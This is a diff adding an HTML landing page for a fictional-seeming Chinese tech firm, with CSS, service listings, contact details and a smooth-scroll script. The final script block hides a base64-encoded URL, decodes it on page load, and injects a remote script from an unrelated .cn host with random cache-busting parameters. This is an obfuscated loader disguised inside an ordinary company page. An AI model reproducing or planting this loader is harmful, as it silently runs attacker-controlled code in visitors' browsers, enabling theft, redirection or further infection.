@@ -1,0 +1,390 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>未来之光科技 - 创新驱动，价值共创</title>
+    <style>
+        /* 全局重置与基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Arial', sans-serif;
+            /* 简洁的无衬线字体 */
+            margin: 0;
+            padding: 0;
+            background-color: #fcfcfc;
+            /* 极浅的背景色 */
+            color: #333333;
+            /* 标准深色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+
+        /* 头部 - 简洁大气风格 */
+        header {
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            /* 更现代的无衬线字体 */
+            font-size: 2.2em;
+            /* 适中标题 */
+            color: #2c3e50;
+            /* 深灰蓝色 */
+            letter-spacing: -0.5px;
+            /* 微调字母间距 */
+        }
+
+        header p {
+            font-size: 1em;
+            color: #7f8c8d;
+            /* 柔和灰色 */
+            margin-top: 10px;
+        }
+
+        /* 导航菜单 - 顶部固定，简洁下划线 */
+        nav {
+            background-color: #ffffff;
+            /* 白色背景 */
+            text-align: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            /* 极轻微的阴影 */
+            position: sticky;
+            /* 粘性定位 */
+            top: 0;
+            /* 粘在顶部 */
+            z-index: 1000;
+            /* 确保在最上层 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 10px;
+        }
+
+        nav ul li a {
+            color: #555555;
+            /* 默认文字颜色 */
+            text-decoration: none;
+            padding: 8px 0;
+            position: relative;
+            display: inline-block;
+            font-weight: 500;
+            /* 适中粗细 */
+            font-size: 1em;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a::after {
+            /* 强调色下划线 */
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            /* 更细的下划线 */
+            background-color: #3498db;
+            /* 强调色：蓝色 */
+            bottom: -3px;
+            /* 靠近文字 */
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
+        }
+
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            color: #3498db;
+            /* 强调色 */
+        }
+
+        /* 内容区 - 简洁的卡片与列表风格 */
+        main {
+            padding-top: 20px;
+        }
+
+        section {
+            background-color: #ffffff;
+            margin-bottom: 25px;
+            padding: 25px;
+            border-radius: 8px;
+            /* 较小的圆角 */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            /* 柔和阴影 */
+        }
+
+        section h2 {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-size: 1.6em;
+            color: #2c3e50;
+            margin-top: 0;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+        }
+
+        section h3 {
+            font-size: 1.2em;
+            color: #34495e;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        section p {
+            font-size: 0.95em;
+            color: #555555;
+            margin-bottom: 15px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 15px auto;
+            border-radius: 6px;
+            /* 图片圆角 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
+        }
+
+        .service-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .service-list li {
+            background-color: #f9f9f9;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid #3498db;
+            /* 强调色左边框 */
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        .service-list li:hover {
+            background-color: #f0f4f8;
+            /* 悬停背景色 */
+        }
+
+        .service-list li h3 {
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #3498db;
+            /* 强调色 */
+        }
+
+        .service-list li p {
+            margin-bottom: 0;
+            font-size: 0.9em;
+        }
+
+        .contact-info p {
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+
+        .contact-info a {
+            color: #3498db;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .contact-info a:hover {
+            color: #2980b9;
+        }
+
+        /* 页脚 - 极简风格 */
+        footer {
+            background-color: #ffffff;
+            /* 白色背景 */
+            padding: 20px 0;
+            text-align: center;
+            font-size: 0.85em;
+            color: #7f8c8d;
+            margin-top: 30px;
+            border-top: 1px solid #eeeeee;
+            /* 细分隔线 */
+            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .social-links a {
+            color: #7f8c8d;
+            /* 社交链接颜色 */
+            text-decoration: none;
+            margin: 0 12px;
+            font-size: 1.1em;
+            /* 适中图标大小 */
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #3498db;
+            /* 强调色 */
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>未来之光科技</h1>
+            <p>创新驱动，价值共创</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#about-us">关于我们</a></li>
+                <li><a href="#our-expertise">核心专长</a></li>
+                <li><a href="#contact-us">联系方式</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="about-us">
+                <h2>关于我们</h2>
+                <img src="https://picsum.photos/300/200?random=1" alt="公司团队" class="random-image">
+                <p>未来之光科技是一家专注于前沿技术研发与应用的高科技企业。我们致力于为客户提供创新、高效、可靠的数字化解决方案，助力企业实现业务增长与转型。</p>
+                <p>我们拥有一支充满活力和创造力的专业团队，秉持“以客户为中心”的理念，不断探索技术边界，为各行业带来突破性的产品和服务。</p>
+            </section>
+
+            <section id="our-expertise">
+                <h2>核心专长</h2>
+                <p>我们专注于以下领域，提供专业、定制化的服务：</p>
+                <ul class="service-list">
+                    <li>
+                        <h3>人工智能与机器学习</h3>
+                        <p>开发智能算法，提供数据分析、预测模型和自动化解决方案。</p>
+                    </li>
+                    <li>
+                        <h3>云计算与大数据</h3>
+                        <p>构建可扩展的云基础设施，处理和分析海量数据，提供数据驱动的洞察。</p>
+                    </li>
+                    <li>
+                        <h3>物联网 (IoT) 解决方案</h3>
+                        <p>设计和部署智能设备网络，实现设备互联、数据采集与远程控制。</p>
+                    </li>
+                    <li>
+                        <h3>区块链技术应用</h3>
+                        <p>探索区块链在数据安全、供应链管理和数字资产等领域的创新应用。</p>
+                    </li>
+                </ul>
+                <img src="https://picsum.photos/300/200?random=2" alt="技术专长" class="random-image">
+            </section>
+
+            <section id="contact-us">
+                <h2>联系方式</h2>
+                <p>欢迎与我们联系，共同探讨合作机会。</p>
+                <div class="contact-info">
+                    <p><strong>公司地址：</strong> 科技创新园B区501室</p>
+                    <p><strong>联系电话：</strong> <a href="tel:+861012345678">+86 10 1234 5678</a></p>
+                    <p><strong>电子邮箱：</strong> <a href="mailto:info@futurelight.com">info@futurelight.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 17:30</p>
+                    <p>
+                        <!-- 地图占位符 -->
+                        <img src="https://placehold.co/300x200/e0e0e0/555555?text=公司位置示意图" alt="公司位置示意图"
+                            class="random-image">
+                    </p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 未来之光科技. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微信</a> |
+                <a href="#" target="_blank">领英</a> |
+                <a href="#" target="_blank">官网</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault(); // 阻止默认跳转
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script>
+
+</body>
+
+</html>
